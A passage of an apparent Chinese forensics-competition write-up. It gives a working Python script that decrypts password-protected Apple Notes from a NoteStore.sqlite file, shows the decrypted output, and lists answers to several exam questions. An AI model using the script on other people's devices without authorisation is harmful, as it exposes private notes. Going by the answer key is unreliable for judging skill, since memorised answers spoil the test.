+</span></span><span style="display:flex;"><span>    <span style="color:#98c379">&#34;&#34;&#34;AES-GCM 解密&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">cipher</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">AES</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">new</span>(<span style="color:#e06c75">key</span>, <span style="color:#e06c75">AES</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">MODE_GCM</span>, <span style="color:#e06c75">nonce</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">nonce</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#7f848e"># 关联数据为空，不传 assoc_data</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">return</span> <span style="color:#e06c75">cipher</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">decrypt_and_verify</span>(<span style="color:#e06c75">ciphertext</span>, <span style="color:#e06c75">tag</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">except</span> <span style="color:#e06c75">ValueError</span> <span style="color:#c678dd">as</span> <span style="color:#e06c75">e</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">print</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;[-] AES-GCM Decryption failed: </span><span style="color:#98c379">{</span><span style="color:#e06c75">e</span><span style="color:#98c379">}</span><span style="color:#98c379">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">return</span> <span style="color:#e5c07b">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">def</span> <span style="color:#61afef;font-weight:bold">main</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> <span style="color:#e5c07b">len</span>(<span style="color:#e06c75">sys</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">argv</span>) <span style="color:#56b6c2">!=</span> <span style="color:#d19a66">3</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">print</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;Usage: </span><span style="color:#98c379">{</span><span style="color:#e06c75">sys</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">argv</span>[<span style="color:#d19a66">0</span>]<span style="color:#98c379">}</span><span style="color:#98c379"> NoteStore.sqlite password&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">sys</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">exit</span>(<span style="color:#d19a66">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">db_file</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">sys</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">argv</span>[<span style="color:#d19a66">1</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">password</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">sys</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">argv</span>[<span style="color:#d19a66">2</span>]<span style="color:#56b6c2">.</span><span style="color:#e06c75">encode</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">conn</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">sqlite3</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">connect</span>(<span style="color:#e06c75">db_file</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">cursor</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">conn</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">cursor</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">cursor</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">execute</span>(<span style="color:#98c379">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">            SELECT
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">                t1.Z_PK,
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">                t1.ZCRYPTOITERATIONCOUNT,
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">                t1.ZCRYPTOSALT,
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">                t1.ZCRYPTOWRAPPEDKEY,
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">                t1.ZENCRYPTEDVALUESJSON,
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">                t2.ZCRYPTOINITIALIZATIONVECTOR,
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">                t2.ZCRYPTOTAG,
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">                t2.ZDATA
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">            FROM
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">                ZICCLOUDSYNCINGOBJECT AS t1
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">            JOIN
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">                ZICNOTEDATA AS t2 ON t1.Z_PK = t2.ZNOTE
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">            WHERE
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">                t1.ZISPASSWORDPROTECTED = 1
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">        &#34;&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">except</span> <span style="color:#e06c75">sqlite3</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">OperationalError</span> <span style="color:#c678dd">as</span> <span style="color:#e06c75">e</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">print</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;[!] Database query failed. The schema might be different. Error: </span><span style="color:#98c379">{</span><span style="color:#e06c75">e</span><span style="color:#98c379">}</span><span style="color:#98c379">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">conn</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">close</span>()
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">sys</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">exit</span>(<span style="color:#d19a66">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">rows</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">cursor</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">fetchall</span>()
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> <span style="color:#56b6c2">not</span> <span style="color:#e06c75">rows</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[!] No password protected notes found in the database.&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">conn</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">close</span>()
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">return</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">decryption_successful</span> <span style="color:#56b6c2">=</span> <span style="color:#e5c07b">False</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">for</span> <span style="color:#e06c75">row</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">rows</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">pk</span>, <span style="color:#e06c75">iterations</span>, <span style="color:#e06c75">salt</span>, <span style="color:#e06c75">wrapped_key_blob</span>, <span style="color:#e06c75">encrypted_json</span>, <span style="color:#e06c75">iv_blob</span>, <span style="color:#e06c75">tag_blob</span>, <span style="color:#e06c75">data_blob</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">row</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">print</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">--- Processing Note Z_PK=</span><span style="color:#98c379">{</span><span style="color:#e06c75">pk</span><span style="color:#98c379">}</span><span style="color:#98c379"> ---&#34;</span>)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">not</span> (<span style="color:#e06c75">salt</span> <span style="color:#56b6c2">and</span> <span style="color:#e06c75">wrapped_key_blob</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[*] Skipping note due to missing salt or wrapped key.&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">continue</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">salt</span> <span style="color:#56b6c2">=</span> <span style="color:#e5c07b">bytes</span>(<span style="color:#e06c75">salt</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">wrapped_key_blob</span> <span style="color:#56b6c2">=</span> <span style="color:#e5c07b">bytes</span>(<span style="color:#e06c75">wrapped_key_blob</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">try</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#7f848e"># 步骤 1: 派生主密钥 (KEK)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Step 1: Deriving Key Encrypting Key using PBKDF2-SHA256...&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">main_key</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">PBKDF2</span>(<span style="color:#e06c75">password</span>, <span style="color:#e06c75">salt</span>, <span style="color:#e06c75">dkLen</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">16</span>, <span style="color:#e06c75">count</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">iterations</span>, <span style="color:#e06c75">hmac_hash_module</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">SHA256</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#7f848e"># 步骤 2: 使用 cryptography AES Key Unwrap 解包笔记密钥</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Step 2: Unwrapping note encryption key using AES Key Unwrap...&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">aes_key</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">aes_key_unwrap</span>(<span style="color:#e06c75">main_key</span>, <span style="color:#e06c75">wrapped_key_blob</span>, <span style="color:#e06c75">backend</span><span style="color:#56b6c2">=</span><span style="color:#e06c75">default_backend</span>())
+</span></span><span style="display:flex;"><span>            <span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;[+] Successfully unwrapped note key!&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">except</span> (<span style="color:#e06c75">ValueError</span>, <span style="color:#e06c75">TypeError</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">e</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#e5c07b">print</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;[!] Step 2 FAILED. This almost certainly means the password &#39;</span><span style="color:#98c379">{</span><span style="color:#e06c75">sys</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">argv</span>[<span style="color:#d19a66">2</span>]<span style="color:#98c379">}</span><span style="color:#98c379">&#39; is incorrect. Error: </span><span style="color:#98c379">{</span><span style="color:#e06c75">e</span><span style="color:#98c379">}</span><span style="color:#98c379">&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">continue</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#7f848e"># 步骤 3: 选择要解密的笔记数据</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">data_to_decrypt</span> <span style="color:#56b6c2">=</span> <span style="color:#e5c07b">None</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">source_column</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#e06c75">encrypted_json</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">data_to_decrypt</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">encrypted_json</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">source_column</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;ZENCRYPTEDVALUESJSON&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">elif</span> <span style="color:#e06c75">data_blob</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">data_to_decrypt</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">data_blob</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">source_column</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;ZDATA from ZICNOTEDATA&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#e5c07b">print</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;[*] Note Z_PK=</span><span style="color:#98c379">{</span><span style="color:#e06c75">pk</span><span style="color:#98c379">}</span><span style="color:#98c379"> key was unwrapped, but no content data found to decrypt.&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">decryption_successful</span> <span style="color:#56b6c2">=</span> <span style="color:#e5c07b">True</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">continue</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">print</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;[+] Step 3: Found encrypted content in column &#39;</span><span style="color:#98c379">{</span><span style="color:#e06c75">source_column</span><span style="color:#98c379">}</span><span style="color:#98c379">&#39;.&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">data_to_decrypt</span> <span style="color:#56b6c2">=</span> <span style="color:#e5c07b">bytes</span>(<span style="color:#e06c75">data_to_decrypt</span>)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#7f848e"># 步骤 4: AES-GCM 解密笔记内容</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">not</span> (<span style="color:#e06c75">iv_blob</span> <span style="color:#56b6c2">and</span> <span style="color:#e06c75">tag_blob</span>):
+</span></span><span style="display:flex;"><span>             <span style="color:#e5c07b">print</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;[*] Skipping content decryption for Z_PK=</span><span style="color:#98c379">{</span><span style="color:#e06c75">pk</span><span style="color:#98c379">}</span><span style="color:#98c379">, missing IV or Tag in ZICNOTEDATA.&#34;</span>)
+</span></span><span style="display:flex;"><span>             <span style="color:#c678dd">continue</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">nonce_d</span> <span style="color:#56b6c2">=</span> <span style="color:#e5c07b">bytes</span>(<span style="color:#e06c75">iv_blob</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">tag_d</span> <span style="color:#56b6c2">=</span> <span style="color:#e5c07b">bytes</span>(<span style="color:#e06c75">tag_blob</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ciphertext_d</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">data_to_decrypt</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">print</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;[+] Step 4: Decrypting note content using AES-GCM...&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">plaintext_gzipped</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">decrypt_aes_gcm</span>(<span style="color:#e06c75">aes_key</span>, <span style="color:#e06c75">nonce_d</span>, <span style="color:#e06c75">ciphertext_d</span>, <span style="color:#e06c75">tag_d</span>)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#e06c75">plaintext_gzipped</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#7f848e"># 步骤 5: Gzip 解压</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e5c07b">print</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;[+] Step 5: Decompressing Gzip data...&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">try</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">decompressed_data</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">zlib</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">decompress</span>(<span style="color:#e06c75">plaintext_gzipped</span>, <span style="color:#d19a66">16</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">zlib</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">MAX_WBITS</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#e5c07b">print</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;======== DECRYPTED NOTE (Z_PK=</span><span style="color:#98c379">{</span><span style="color:#e06c75">pk</span><span style="color:#98c379">}</span><span style="color:#98c379">) ========&#34;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#7f848e"># 只显示可解码文本，忽略不可打印字符</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e5c07b">print</span>(<span style="color:#e06c75">decompressed_data</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">decode</span>(<span style="color:#98c379">&#39;utf-8&#39;</span>, <span style="color:#e06c75">errors</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;ignore&#39;</span>))
+</span></span><span style="display:flex;"><span>                <span style="color:#e5c07b">print</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;</span><span style="color:#98c379">{</span><span style="color:#98c379">&#39;=&#39;</span><span style="color:#56b6c2">*</span><span style="color:#d19a66">60</span><span style="color:#98c379">}</span><span style="color:#98c379">\n</span><span style="color:#98c379">&#34;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">decryption_successful</span> <span style="color:#56b6c2">=</span> <span style="color:#e5c07b">True</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">except</span> <span style="color:#e06c75">zlib</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">error</span> <span style="color:#c678dd">as</span> <span style="color:#e06c75">e</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#e5c07b">print</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;[!] Gzip decompression failed for Z_PK=</span><span style="color:#98c379">{</span><span style="color:#e06c75">pk</span><span style="color:#98c379">}</span><span style="color:#98c379">. Error: </span><span style="color:#98c379">{</span><span style="color:#e06c75">e</span><span style="color:#98c379">}</span><span style="color:#98c379">&#34;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#e5c07b">print</span>(<span style="color:#98c379">f</span><span style="color:#98c379">&#34;Raw decrypted data (gzipped):</span><span style="color:#98c379">\n</span><span style="color:#98c379">{</span><span style="color:#e06c75">plaintext_gzipped</span><span style="color:#98c379">}</span><span style="color:#98c379">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">conn</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">close</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> <span style="color:#56b6c2">not</span> <span style="color:#e06c75">decryption_successful</span> <span style="color:#56b6c2">and</span> <span style="color:#e06c75">rows</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;</span><span style="color:#98c379">\n</span><span style="color:#98c379">[!] Decryption failed for all notes. Please double-check the password.&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> <span style="color:#e06c75">__name__</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">main</span>()
+</span></span></code></pre></div><p>简单说一下运行过程：</p>
+<p>脚本首先将我们输入的密码、从数据库<code>ZICCLOUDSYNCINGOBJECT</code>表中读取的盐和迭代次数 三者混合，进行20000次SHA256哈希，得到主密钥，用主密钥去解密从<code>ZICCLOUDSYNCINGOBJECT</code>表得到的 <code>ZCRYPTOWRAPPEDKEY</code>列，取出专门用于加密这条笔记内容的笔记密钥</p>
+<p>接着脚本会检查两个可能存放笔记内容的位置，使用笔记密钥配合从<code>ZICNOTEDATA</code>表中读取的初始化向量和认证标签，对加密内容进行解密</p>
+<p>最后解密出的数据并非纯文本，而是一个gzip压缩包，调用<code>zlib.decompress</code>函数对其进行解压，得到最终的二进制数据（Protobuf格式），再尽力将这些二进制数据解码为UTF-8文本，并将其中可读的部分打印在屏幕上</p>
+<p>嗯，真是太麻烦了</p>
+<p>总之下一步，使用下面的命令运行脚本，注意传入明文密钥（少什么库就下载什么）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python decrypt_notes.py NoteStore.sqlite <span style="color:#98c379">&#34;234567&#34;</span>
+</span></span></code></pre></div><p>输出结果：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>--- Processing Note <span style="color:#e06c75">Z_PK</span><span style="color:#56b6c2">=</span><span style="color:#d19a66">31</span> ---
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">[</span>+<span style="color:#56b6c2">]</span> Step 1: Deriving Key Encrypting Key using PBKDF2-SHA256...
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">[</span>+<span style="color:#56b6c2">]</span> Step 2: Unwrapping note encryption key using AES Key Unwrap...
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">[</span>+<span style="color:#56b6c2">]</span> Successfully unwrapped note key!
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">[</span>+<span style="color:#56b6c2">]</span> Step 3: Found encrypted content in column <span style="color:#98c379">&#39;ZDATA from ZICNOTEDATA&#39;</span>.
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">[</span>+<span style="color:#56b6c2">]</span> Step 4: Decrypting note content using AES-GCM...
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">[</span>+<span style="color:#56b6c2">]</span> Step 5: Decompressing Gzip data...
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">========</span> DECRYPTED NOTE <span style="color:#56b6c2">(</span><span style="color:#e06c75">Z_PK</span><span style="color:#56b6c2">=</span>31<span style="color:#56b6c2">)</span> <span style="color:#56b6c2">========</span>
+</span></span><span style="display:flex;"><span>▒
+</span></span><span style="display:flex;"><span> Halo
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>123456▒
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">(</span>▒
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">(</span>▒
+</span></span><span style="display:flex;"><span> <span style="color:#56b6c2">(</span>▒
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">(</span>▒
+</span></span><span style="display:flex;"><span><span style="color:#98c379">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">▒
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">c=!FCe8▒h▒hȕ*
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">hȕ*
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">  ▒hȕ*
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">     ▒hȕ*
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">        ▒hɕ*
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">           ▒hɕ
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">============================================================
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">--- Processing Note Z_PK=33 ---
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">[+] Step 1: Deriving Key Encrypting Key using PBKDF2-SHA256...
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">[+] Step 2: Unwrapping note encryption key using AES Key Unwrap...
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">[+] Successfully unwrapped note key!
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">[+] Step 3: Found encrypted content in column &#39;ZDATA from ZICNOTEDATA&#39;.
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">[+] Step 4: Decrypting note content using AES-GCM...
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">[+] Step 5: Decompressing Gzip data...
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">======== DECRYPTED NOTE (Z_PK=33) ========
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">今天
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">▒
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">(▒
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">(▒
+</span></span></span><span style="display:flex;"><span><span style="color:#98c379">&#34;</span>
+</span></span><span style="display:flex;"><span>▒
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">c</span><span style="color:#56b6c2">=</span>!FC*8
+</span></span><span style="display:flex;"><span>    h☚*
+</span></span><span style="display:flex;"><span>     h☚*
+</span></span><span style="display:flex;"><span>h☚
+</span></span><span style="display:flex;"><span><span style="color:#56b6c2">============================================================</span>
+</span></span></code></pre></div><p>上面的是&quot;Halo&quot;的，下面的是&quot;今天&quot;的，它们的内容和很多<code>▒</code>这样的奇怪字符混在一起，是因为它们被包裹在 Protobuf这种二进制结构中，用于保存格式、字体、附件引用等信息，我们现在看到的，就是把这个复杂的二进制结构强行当成文本显示的结果</p>
+<p>如何分辨？那最好还是丢给ai：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250815134842012.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815134842012"
+	
+	
+></p>
+<p>那么123456应该就是题目说的数字串了</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>123456
+</span></span></code></pre></div><p>此时37题的真正的答案也出来了：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Halo
+</span></span></code></pre></div><h1 id="林浚熙计算机39-52">林浚熙计算机(39-52)
+</h1><h2 id="39林浚熙计算机computer-的操作系统operating-system-版本是什么">39.林浚熙计算机(Computer) 的操作系统(Operating System) 版本是什么?
+</h2><p><strong>A. Windows 10 Pro for Workstations 21H2</strong></p>
+<p><strong>B. Windows 10 Pro 22H2</strong></p>
+<p><strong>C. Windows 10 Home 21H2</strong></p>
+<p><strong>D. Windows 10 Pro for Workstations 21H1</strong></p>
+<p><img src="http://picture.928330.xyz/typora/image-20250815101130265.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815101130265"
+	
+	
+></p>
+<p>操作系统名称为Windows 10 Pro for Workstations，当前Build版本号是<code>19044.2130</code>，这是Windows 10 21H2的一个更新版本</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e06c75">A</span>
+</span></span></code></pre></div><h2 id="40林浚照计算机安装了什么品牌的虚拟专用网络-virtual-private-network---vpn软件不要输入符号及空白以大写英文及阿拉伯数字回答">40.林浚照计算机安装了什么品牌的虚拟专用网络 Virtual Private Network - VPN)软件?(不要输入符号及空白，以大写英文及阿拉伯数字回答)
+</h2><p>火眼支持详细分析的软件里面没有vpn，但在用户桌面找到一个快捷方式，ExpressVPN：</p>
+<p><img src="http://picture.928330.xyz/typora/image-20250815140909760.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815140909760"
+	
+	
+></p>
+<p>为了保险起见（万一名称不完整），文件系统里面搜一下，确实是vpn：
+<img src="http://picture.928330.xyz/typora/image-20250815141014058.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250815141014058"
+	
+	
+></p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>ExpressVPN
+</span></span></code></pre></div><h2 id="41承上题分析该虚拟专用网络的日志log他在哪天安装该虚拟专用网络如答案为-2022-12-29需回答-20221229">41.承上题，分析该虚拟专用网络的日志(Log)，他在哪天安装该虚拟专用网络?(如答案为 2022-12-29，需回答 20221229)
+</h2><p>log那么长谁看啊，直接火眼基本信息里看安装软件：</p>
